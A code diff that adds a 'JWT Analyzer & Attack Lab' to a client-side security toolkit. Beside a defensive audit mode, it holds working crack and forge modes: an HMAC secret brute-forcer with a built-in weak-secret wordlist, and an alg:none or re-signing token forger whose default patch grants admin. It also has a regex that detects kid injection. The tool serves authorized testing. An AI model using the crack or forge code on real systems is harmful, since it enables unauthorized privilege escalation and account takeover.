@@ -23,67 +23,267 @@ function splitJwt(token) {
   return parts;
 }
 
+// ---------------- JWT flagship: shared helpers ----------------
+// bits for the HS* / RS* / ES* / PS* family -> SHA size and a human label.
+const JWT_ALGS = {
+  none: { kind: "none", bits: 0, note: "unsigned" },
+  HS256: { kind: "hmac", bits: 256, note: "HMAC-SHA256, symmetric (shared secret)" },
+  HS384: { kind: "hmac", bits: 384, note: "HMAC-SHA384, symmetric (shared secret)" },
+  HS512: { kind: "hmac", bits: 512, note: "HMAC-SHA512, symmetric (shared secret)" },
+  RS256: { kind: "rsa", bits: 256, note: "RSASSA-PKCS1 + SHA256, asymmetric" },
+  RS384: { kind: "rsa", bits: 384, note: "RSASSA-PKCS1 + SHA384, asymmetric" },
+  RS512: { kind: "rsa", bits: 512, note: "RSASSA-PKCS1 + SHA512, asymmetric" },
+  PS256: { kind: "rsa", bits: 256, note: "RSASSA-PSS + SHA256, asymmetric" },
+  PS384: { kind: "rsa", bits: 384, note: "RSASSA-PSS + SHA384, asymmetric" },
+  PS512: { kind: "rsa", bits: 512, note: "RSASSA-PSS + SHA512, asymmetric" },
+  ES256: { kind: "ec", bits: 256, note: "ECDSA P-256 + SHA256, asymmetric" },
+  ES384: { kind: "ec", bits: 384, note: "ECDSA P-384 + SHA384, asymmetric" },
+  ES512: { kind: "ec", bits: 512, note: "ECDSA P-521 + SHA512, asymmetric" },
+  EdDSA: { kind: "ec", bits: 512, note: "Ed25519/Ed448, asymmetric" },
+};
+// Registered-claim one-liners (RFC 7519) for the decoded-claims table.
+const JWT_CLAIM_DESC = {
+  iss: "Issuer", sub: "Subject", aud: "Audience", exp: "Expires", nbf: "Not before",
+  iat: "Issued at", jti: "JWT ID", azp: "Authorized party", scope: "Scope",
+  scp: "Scope", roles: "Roles", role: "Role", groups: "Groups", email: "Email",
+  name: "Name", preferred_username: "Username", client_id: "Client ID",
+};
+const JWT_TIME_CLAIMS = ["exp", "nbf", "iat", "auth_time"];
+// A compact, realistic weak-secret wordlist used both by the auto-check in Analyze
+// and the Crack mode. Kept inline per the mini-tool contract (no external data).
+const JWT_WEAK_SECRETS = [
+  "secret", "secret123", "password", "password123", "123456", "changeme", "admin",
+  "administrator", "root", "test", "jwt", "jwtsecret", "jwt_secret", "jwtkey",
+  "mysecret", "mysecretkey", "supersecret", "supersecretkey", "topsecret",
+  "key", "private", "privatekey", "default", "example", "demo", "dev", "development",
+  "prod", "production", "staging", "qwerty", "letmein", "welcome", "hello",
+  "your-256-bit-secret", "your_jwt_secret", "s3cr3t", "s3cret", "p@ssw0rd",
+  "P@ssw0rd", "0000", "1234", "12345678", "iloveyou", "token", "auth", "authsecret",
+  "sessionsecret", "session_secret", "signingkey", "signing_key", "hmac", "hmackey",
+  "shhhhh", "shhh", "null", "undefined", "none", "foo", "bar", "foobar", "baz",
+];
+// Payload keys that should never be inside a (non-encrypted) JWS payload.
+const JWT_SENSITIVE_RE = /pass(word|wd)?|secret|api[_-]?key|private[_-]?key|\bpwd\b|\bssn\b|credit|card(num)?|cvv|cvc|pin\b|token|bank|routing|iban|mother'?s?[_-]?maiden/i;
+// Characters / patterns in a kid that suggest injection (path traversal, SQLi, cmd).
+const JWT_KID_BAD = /\.\.|[\/\\]|['"`;]|--|\bunion\b|\bselect\b|\bor\b\s+\d|%00|\$\(|\bfile:/i;
+
+function jwtHumanTime(sec) {
+  const n = Number(sec);
+  if (!isFinite(n)) return "(not a number)";
+  const d = new Date(n * 1000);
+  if (isNaN(d.getTime())) return "(out of range)";
+  return d.toISOString().replace("T", " ").replace(/\.\d+Z$/, " UTC");
+}
+function jwtRel(sec, now) {
+  const diff = Number(sec) - now;
+  const a = Math.abs(diff);
+  const u = a < 60 ? `${Math.round(a)}s` : a < 3600 ? `${Math.round(a / 60)}m`
+    : a < 86400 ? `${Math.round(a / 3600)}h` : a < 31536000 ? `${Math.round(a / 86400)}d`
+      : `${(a / 31536000).toFixed(1)}y`;
+  return diff >= 0 ? `in ${u}` : `${u} ago`;
+}
+function jwtDecodePart(part, H) { return JSON.parse(H.fromBytes(b64urlDecodeToBytes(part))); }
+// HMAC-sign the signing input with the right SHA size for an HS* alg -> base64url sig.
+async function jwtHsSign(signingInput, secret, bits, H) {
+  const hex = await H.hmac(`SHA-${bits}`, secret, signingInput);
+  return b64urlEncodeBytes(H.fromHex(hex));
+}
+// Recursively collect "path -> value" leaves of the payload for the sensitive-data scan.
+function jwtLeaves(obj, prefix, out) {
+  if (obj && typeof obj === "object") {
+    for (const k of Object.keys(obj)) jwtLeaves(obj[k], prefix ? `${prefix}.${k}` : k, out);
+  } else {
+    out.push([prefix, obj]);
+  }
+  return out;
+}
+
 export const TOOLS = [
-  // ---------------- JWT ----------------
-  { id: "w-jwt-decode", name: "JWT Decoder", cat: "websec", desc: "Decode a JSON Web Token's header and payload without verifying the signature (authorized token inspection).", tags: ["jwt", "jose", "token"],
-    inputs: [{ k: "token", label: "JWT", type: "textarea", rows: 4, placeholder: "eyJhbGciOi..." }],
-    run(v, H) {
-      if (!v.token) return "";
-      const parts = splitJwt(v.token);
-      if (!parts || parts.length < 2) return { error: "Not a JWT (expected header.payload.signature)." };
-      try {
-        const header = JSON.parse(H.fromBytes(b64urlDecodeToBytes(parts[0])));
-        const payload = JSON.parse(H.fromBytes(b64urlDecodeToBytes(parts[1])));
-        const sig = parts[2] ? parts[2] : "(none)";
-        return `HEADER:\n${jsonPretty(header)}\n\nPAYLOAD:\n${jsonPretty(payload)}\n\nSIGNATURE (base64url): ${sig}`;
-      } catch (e) { return { error: "Could not decode: malformed base64url or JSON." }; }
-    } },
-
-  { id: "w-jwt-none", name: "JWT alg:none PoC Builder", cat: "websec", desc: "Re-encode a JWT with alg:none and a stripped signature, to test for missing signature-verification (authorized testing).", tags: ["jwt", "alg none", "bypass"],
-    inputs: [{ k: "token", label: "Original JWT", type: "textarea", rows: 3 }, { k: "variant", label: "alg value", type: "select", opts: ["none", "None", "NONE"], value: "none" }],
-    run(v, H) {
-      if (!v.token) return "";
-      const parts = splitJwt(v.token);
-      if (!parts || parts.length < 2) return { error: "Not a JWT." };
-      try {
-        const header = JSON.parse(H.fromBytes(b64urlDecodeToBytes(parts[0])));
-        header.alg = v.variant;
-        const h64 = b64urlEncodeBytes(H.bytes(JSON.stringify(header)));
-        const p64 = parts[1];
-        return `${h64}.${p64}.\n\n(trailing dot = empty signature; some libraries also accept the dot omitted)`;
-      } catch (e) { return { error: "Could not parse header JSON." }; }
-    } },
-
-  { id: "w-jwt-hs256-verify", name: "JWT HS256 Verifier", cat: "websec", desc: "Verify a JWT's HS256 signature against a candidate secret (authorized secret brute-force / config checks).", tags: ["jwt", "hs256", "hmac", "verify"],
-    inputs: [{ k: "token", label: "JWT", type: "textarea", rows: 3 }, { k: "secret", label: "Secret", type: "text", placeholder: "supersecret" }],
+  // ---------------- JWT flagship ----------------
+  { id: "w-jwt-analyzer", name: "JWT Analyzer & Attack Lab", cat: "websec",
+    desc: "Decode a JWT and run a full security audit (alg:none, RS→HS key confusion, kid/jku/jwk injection, weak-secret auto-crack, expiry & claim hygiene), brute-force the HMAC secret, or forge a tampered token — all client-side, for authorized testing.",
+    tags: ["jwt", "jose", "jws", "token", "alg none", "kid", "jku", "jwk", "key confusion", "hs256", "crack", "forge", "audit", "scanner"],
+    button: "Run",
+    inputs: [
+      { k: "token", label: "JWT", type: "textarea", rows: 4, placeholder: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.XXXXX" },
+      { k: "mode", label: "Mode", type: "select", value: "analyze", opts: [["analyze", "Analyze — decode + security audit"], ["crack", "Crack — brute-force the HMAC secret"], ["forge", "Forge — tamper claims + re-sign"]] },
+      { k: "wordlist", label: "Crack: extra secrets (one per line)", type: "textarea", rows: 3, placeholder: "candidate secrets, one per line — tried in addition to the built-in weak-secret list" },
+      { k: "patch", label: "Forge: claim changes (JSON merged into payload)", type: "textarea", rows: 2, value: '{"role":"admin"}' },
+      { k: "forgeAlg", label: "Forge: output", type: "select", value: "none", opts: [["none", "alg:none — strip the signature"], ["hs256", "HS256 — re-sign with secret below"], ["keep", "Keep header alg — HS-sign with secret below"]] },
+      { k: "forgeSecret", label: "Forge: HMAC secret (for re-sign)", type: "text", placeholder: "secret" },
+    ],
     async run(v, H) {
-      if (!v.token || !v.secret) return "";
-      const parts = splitJwt(v.token);
-      if (!parts || parts.length !== 3) return { error: "Not a complete JWT (need header.payload.signature)." };
-      try {
-        const header = JSON.parse(H.fromBytes(b64urlDecodeToBytes(parts[0])));
-        if (header.alg !== "HS256") return { error: `Header alg is "${header.alg}", not HS256.` };
-        const hex = await H.hmac("SHA-256", v.secret, `${parts[0]}.${parts[1]}`);
-        const bytes = H.fromHex(hex);
-        const expected = b64urlEncodeBytes(bytes);
-        const ok = expected === parts[2];
-        return ok ? "VALID — signature matches secret." : `INVALID — expected ${expected}\ngot      ${parts[2]}`;
-      } catch (e) { return { error: "Could not verify: malformed token." }; }
-    } },
-
-  { id: "w-jwt-hs256-sign", name: "JWT HS256 Signer", cat: "websec", desc: "Build and sign a JWT (HS256) from a header, payload and secret, for testing token-handling logic.", tags: ["jwt", "hs256", "sign", "build"],
-    inputs: [{ k: "header", label: "Header JSON", type: "textarea", rows: 2, value: '{"alg":"HS256","typ":"JWT"}' }, { k: "payload", label: "Payload JSON", type: "textarea", rows: 4, value: '{"sub":"1234567890","name":"tester","iat":1700000000}' }, { k: "secret", label: "Secret", type: "text", placeholder: "supersecret" }],
-    async run(v, H) {
-      if (!v.header || !v.payload || !v.secret) return "";
+      const token = String(v.token || "").trim();
+      if (!token) return "";
+      const parts = splitJwt(token);
+      if (!parts || parts.length < 2) return { error: "Not a JWT — expected at least header.payload separated by dots." };
       let header, payload;
-      try { header = JSON.parse(v.header); } catch (e) { return { error: "Header is not valid JSON." }; }
-      try { payload = JSON.parse(v.payload); } catch (e) { return { error: "Payload is not valid JSON." }; }
-      header.alg = "HS256";
-      const h64 = b64urlEncodeBytes(H.bytes(JSON.stringify(header)));
-      const p64 = b64urlEncodeBytes(H.bytes(JSON.stringify(payload)));
-      const hex = await H.hmac("SHA-256", v.secret, `${h64}.${p64}`);
-      const sig = b64urlEncodeBytes(H.fromHex(hex));
-      return `${h64}.${p64}.${sig}`;
+      try { header = jwtDecodePart(parts[0], H); } catch (e) { return { error: "Header is not valid base64url JSON." }; }
+      try { payload = jwtDecodePart(parts[1], H); } catch (e) { return { error: "Payload is not valid base64url JSON." }; }
+      if (payload === null || typeof payload !== "object") payload = { _value: payload };
+      const sigB64 = parts[2] || "";
+      const signingInput = `${parts[0]}.${parts[1]}`;
+      const alg = header.alg;
+      const spec = JWT_ALGS[alg] || null;
+      const now = Math.floor(Date.now() / 1000);
+
+      // ---- CRACK MODE ----
+      if (v.mode === "crack") {
+        if (!sigB64) return { error: "This token has no signature to crack (it is unsigned)." };
+        if (!spec || spec.kind !== "hmac") return { error: `Cracking only applies to HMAC tokens (HS256/384/512). This token is alg "${alg}".` };
+        const extra = String(v.wordlist || "").split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
+        const list = Array.from(new Set([...JWT_WEAK_SECRETS, ...extra]));
+        let hit = null;
+        for (const cand of list) {
+          if (await jwtHsSign(signingInput, cand, spec.bits, H) === sigB64) { hit = cand; break; }
+        }
+        const head = `CRACK  (${alg}, HMAC-SHA${spec.bits})\nTried ${list.length} candidate secret${list.length === 1 ? "" : "s"}${extra.length ? ` (${extra.length} of yours + built-in list)` : " from the built-in weak-secret list"}.\n`;
+        if (hit) {
+          return `${head}\nSECRET FOUND:  ${JSON.stringify(hit)}\n\nThe HMAC secret is guessable. An attacker who recovers it can mint arbitrary valid tokens.\nFix: use a long (>= 32 byte) random secret, or switch to an asymmetric alg (RS256/ES256) so the signing key never reaches clients.`;
+        }
+        return `${head}\nNot found in ${list.length} candidates. Add a real wordlist above (one secret per line) to go further.\nNote: this is an online guess over the list you provide — it does not try every possible string.`;
+      }
+
+      // ---- FORGE MODE ----
+      if (v.mode === "forge") {
+        let patch = {};
+        const pt = String(v.patch || "").trim();
+        if (pt) { try { patch = JSON.parse(pt); } catch (e) { return { error: "Claim changes are not valid JSON." }; } }
+        if (patch === null || typeof patch !== "object" || Array.isArray(patch)) return { error: "Claim changes must be a JSON object, e.g. {\"role\":\"admin\"}." };
+        const newPayload = Object.assign({}, payload, patch);
+        const changed = Object.keys(patch).map((k) => `  ${k}: ${JSON.stringify(payload[k])} -> ${JSON.stringify(newPayload[k])}`);
+        const newHeader = Object.assign({}, header);
+        let out, how;
+        if (v.forgeAlg === "none") {
+          newHeader.alg = "none";
+          const h64 = b64urlEncodeBytes(H.bytes(JSON.stringify(newHeader)));
+          const p64 = b64urlEncodeBytes(H.bytes(JSON.stringify(newPayload)));
+          out = `${h64}.${p64}.`;
+          how = "alg set to \"none\", signature stripped (trailing dot). Works only against servers that fail to reject unsigned tokens.";
+        } else {
+          const useAlg = v.forgeAlg === "hs256" ? "HS256" : alg;
+          const useSpec = JWT_ALGS[useAlg];
+          if (!useSpec || useSpec.kind !== "hmac") return { error: `"Keep header alg" needs an HMAC alg; this token is "${alg}". Choose HS256 instead.` };
+          if (!v.forgeSecret) return { error: "Enter the HMAC secret to re-sign with." };
+          newHeader.alg = useAlg;
+          const h64 = b64urlEncodeBytes(H.bytes(JSON.stringify(newHeader)));
+          const p64 = b64urlEncodeBytes(H.bytes(JSON.stringify(newPayload)));
+          const sig = await jwtHsSign(`${h64}.${p64}`, v.forgeSecret, useSpec.bits, H);
+          out = `${h64}.${p64}.${sig}`;
+          how = `re-signed with ${useAlg} using the secret you supplied. This is a valid token iff the server trusts that secret (e.g. after a successful crack, or RS->HS key confusion using the public key as the HMAC secret).`;
+        }
+        return `FORGED TOKEN\n${out}\n\nClaims changed:\n${changed.length ? changed.join("\n") : "  (none — add JSON above)"}\n\nMethod: ${how}\n\nFor authorized testing only.`;
+      }
+
+      // ---- ANALYZE MODE (default) ----
+      const F = []; // findings: {sev, msg}
+      const add = (sev, msg) => F.push({ sev, msg });
+      const L = [];
+      L.push("JWT ANALYSIS");
+      L.push("============");
+      L.push(`Structure : ${parts.length} parts (${parts.length === 3 ? "header.payload.signature" : parts.length === 2 ? "header.payload — NO signature segment" : "unexpected"}), ${token.length} chars`);
+      L.push(`Algorithm : ${alg === undefined ? "(missing)" : alg}${spec ? "  — " + spec.note : "  — unrecognized"}`);
+      if (header.typ) L.push(`Type      : ${header.typ}`);
+      if (header.kid !== undefined) L.push(`Key ID    : ${JSON.stringify(header.kid)}`);
+      L.push("");
+      L.push("-- HEADER --");
+      L.push(jsonPretty(header));
+      L.push("");
+      L.push("-- PAYLOAD --");
+      L.push(jsonPretty(payload));
+
+      // Decoded claims table (human-readable times + descriptions)
+      const order = ["iss", "sub", "aud", "azp", "exp", "nbf", "iat", "jti", "scope", "scp", "roles", "role"];
+      const keys = [...order.filter((k) => k in payload), ...Object.keys(payload).filter((k) => !order.includes(k))];
+      if (keys.length) {
+        L.push("");
+        L.push("-- CLAIMS --");
+        for (const k of keys) {
+          const desc = JWT_CLAIM_DESC[k] || "";
+          let val = payload[k];
+          if (JWT_TIME_CLAIMS.includes(k) && typeof val === "number") {
+            val = `${val}  (${jwtHumanTime(val)}, ${jwtRel(val, now)})`;
+          } else {
+            val = JSON.stringify(val);
+            if (val && val.length > 80) val = val.slice(0, 77) + "...";
+          }
+          L.push(`  ${k.padEnd(10)} ${desc.padEnd(13)} ${val}`);
+        }
+      }
+
+      L.push("");
+      L.push("-- SIGNATURE --");
+      if (!sigB64) L.push("  (none) — this token is unsigned");
+      else {
+        let slen = "?";
+        try { slen = b64urlDecodeToBytes(sigB64).length; } catch (e) {}
+        L.push(`  base64url: ${sigB64.length > 60 ? sigB64.slice(0, 57) + "..." : sigB64}  (${slen} bytes)`);
+      }
+
+      // ---------- SECURITY AUDIT ----------
+      const algL = String(alg || "").toLowerCase();
+      if (alg === undefined) add("HIGH", "Header has no \"alg\" — some libraries default to no verification.");
+      if (algL === "none") add("CRITICAL", "alg is \"none\": the signature is not verified. Any party can forge tokens by editing the payload. Server must reject \"none\".");
+      if (!sigB64 && algL !== "none") add("CRITICAL", "Signature segment is empty although alg is not \"none\" — the token is effectively unsigned.");
+      if (spec && spec.kind === "hmac") {
+        add("INFO", `${alg} is symmetric: the same secret signs and verifies. If the API also accepts RS256, it may be vulnerable to RS->HS key confusion (sign with the RSA public key as the HMAC secret).`);
+        // Auto weak-secret check
+        if (sigB64) {
+          let weak = null;
+          for (const cand of JWT_WEAK_SECRETS) {
+            if (await jwtHsSign(signingInput, cand, spec.bits, H) === sigB64) { weak = cand; break; }
+          }
+          if (weak !== null) add("CRITICAL", `Weak HMAC secret recovered automatically: ${JSON.stringify(weak)}. Switch to a long random secret or an asymmetric alg. (Use Crack mode with a wordlist to go further.)`);
+          else add("OK", `Secret is not in the built-in weak-secret list (${JWT_WEAK_SECRETS.length} tried). Try Crack mode with a real wordlist to confirm.`);
+        }
+      }
+      if (spec && (spec.kind === "rsa" || spec.kind === "ec")) add("INFO", `${alg} is asymmetric — the signing (private) key must never reach a client. Verify the server pins the expected alg so it can't be downgraded to HS*/none.`);
+      if (header.jwk !== undefined) add("CRITICAL", "Header embeds a \"jwk\" (public key). If the server verifies against this self-provided key, an attacker signs with their own key pair. Keys must come from server config, never the token.");
+      if (header.jku !== undefined) add("HIGH", `Header has \"jku\" (${JSON.stringify(header.jku)}) — the server may fetch verification keys from this URL (SSRF + key injection). The host must be allow-listed.`);
+      if (header.x5u !== undefined) add("HIGH", `Header has \"x5u\" (${JSON.stringify(header.x5u)}) — remote X.509 cert URL, same SSRF/key-injection risk as jku.`);
+      if (header.x5c !== undefined) add("MEDIUM", "Header embeds \"x5c\" (cert chain). Ensure the chain is validated to a trusted root, not trusted blindly.");
+      if (header.kid !== undefined) {
+        const kid = String(header.kid);
+        if (JWT_KID_BAD.test(kid)) add("HIGH", `"kid" contains injection-looking characters (${JSON.stringify(header.kid)}) — if used in a file path or SQL lookup this enables path traversal / SQLi to control the key.`);
+        else add("INFO", "\"kid\" selects the verification key server-side; confirm it is looked up safely (no path/SQL concatenation).");
+      }
+      if (header.crit !== undefined) add("INFO", `Header declares \"crit\" (${JSON.stringify(header.crit)}); the server must understand every listed extension or reject the token.`);
+
+      // Expiry / temporal hygiene
+      if (!("exp" in payload)) add("HIGH", "No \"exp\" claim — this token never expires. A leaked token is valid forever.");
+      else if (typeof payload.exp === "number" && payload.exp < now) add("MEDIUM", `Token is EXPIRED (exp ${jwtRel(payload.exp, now)}). Valid only against servers that skip expiry checks.`);
+      if ("nbf" in payload && typeof payload.nbf === "number" && payload.nbf > now) add("INFO", `"nbf" is in the future (${jwtRel(payload.nbf, now)}) — not yet valid.`);
+      if ("iat" in payload && typeof payload.iat === "number" && payload.iat > now + 60) add("MEDIUM", `"iat" is in the future (${jwtRel(payload.iat, now)}) — clock skew or a forged/re-dated token.`);
+      if ("iat" in payload && "exp" in payload && typeof payload.iat === "number" && typeof payload.exp === "number") {
+        const life = payload.exp - payload.iat;
+        if (life > 86400) add("LOW", `Long lifetime (${(life / 86400).toFixed(1)} days). Long-lived access tokens widen the theft window; prefer short expiry + refresh tokens.`);
+      }
+      if (!("iat" in payload)) add("LOW", "No \"iat\" — harder to reason about token age and to revoke by issue time.");
+      if (!("jti" in payload)) add("INFO", "No \"jti\" — nothing to key replay/blacklist detection on.");
+      if (!("aud" in payload)) add("LOW", "No \"aud\" — a token for one service may be replayable against another that shares the key.");
+      if (!("iss" in payload)) add("LOW", "No \"iss\" — the verifier can't confirm which issuer minted this token.");
+
+      // Sensitive data + privilege claims
+      const leaves = jwtLeaves(payload, "", []);
+      const sens = leaves.filter(([k, val]) => JWT_SENSITIVE_RE.test(k) || (typeof val === "string" && JWT_SENSITIVE_RE.test(k)));
+      if (sens.length) add("HIGH", `Sensitive-looking claim(s): ${sens.map(([k]) => k).slice(0, 6).join(", ")}. A JWS payload is base64 — NOT encrypted — so anyone can read it. Never put secrets/PII in a JWT.`);
+      const priv = leaves.filter(([k, val]) => /\b(admin|is[_-]?admin|role|roles|scope|scp|superuser|root|privilege|perm)/i.test(k) && /admin|root|super|\*|true|all/i.test(JSON.stringify(val)));
+      if (priv.length) add("INFO", `Privilege claim(s) present: ${priv.map(([k]) => `${k}=${JSON.stringify(leaves.find((l) => l[0] === k)[1])}`).slice(0, 4).join(", ")}. Prime tamper targets — verify the server derives authz from its own store, not the token alone.`);
+
+      // Assemble audit, ordered by severity
+      const RANK = { CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3, INFO: 4, OK: 5 };
+      F.sort((a, b) => RANK[a.sev] - RANK[b.sev]);
+      const counts = {};
+      for (const f of F) if (f.sev !== "OK") counts[f.sev] = (counts[f.sev] || 0) + 1;
+      const sevLine = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"].filter((s) => counts[s]).map((s) => `${counts[s]} ${s.toLowerCase()}`).join(", ") || "no issues flagged";
+      L.push("");
+      L.push("-- SECURITY AUDIT --");
+      L.push(`Summary: ${sevLine}`);
+      L.push("");
+      for (const f of F) L.push(`[${f.sev}] ${f.msg}`);
+      L.push("");
+      L.push("Switch Mode to Crack (brute-force the HMAC secret) or Forge (tamper + re-sign). Authorized testing only.");
+      return L.join("\n");
     } },
 
   // ---------------- Headers / CSP / CORS ----------------
